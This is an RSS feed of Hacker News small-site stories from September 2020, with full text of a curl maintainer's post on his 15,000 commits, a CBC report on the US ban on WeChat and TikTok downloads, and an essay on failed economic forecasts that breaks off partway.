<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 20 Sep 2020 16:24:25 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 20 Sep 2020 16:24:25 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[My first 15000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525665">thread link</a>) | @dosshell
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525665</guid>
            <pubDate>Sat, 19 Sep 2020 06:43:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hand-Optimizing VLIW Assembly Language as a Game]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24525372">thread link</a>) | @luu
<br/>
September 18, 2020 | http://silverspaceship.com/hovalaag/ | <a href="https://web.archive.org/web/*/http://silverspaceship.com/hovalaag/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://silverspaceship.com/hovalaag/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525372</guid>
            <pubDate>Sat, 19 Sep 2020 05:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 166 | Comments 151 (<a href="https://news.ycombinator.com/item?id=24524662">thread link</a>) | @empressplay
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524662</guid>
            <pubDate>Sat, 19 Sep 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522322">thread link</a>) | @behoove
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You’ll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (…) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.”</p></blockquote><p>Gigerenzer’s own conclusion was even more clear:</p><blockquote><p>“Forecasts of dollar-to-euro exchange rates are worthless.”</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate …</p></div></div></div></div></div></div></div>
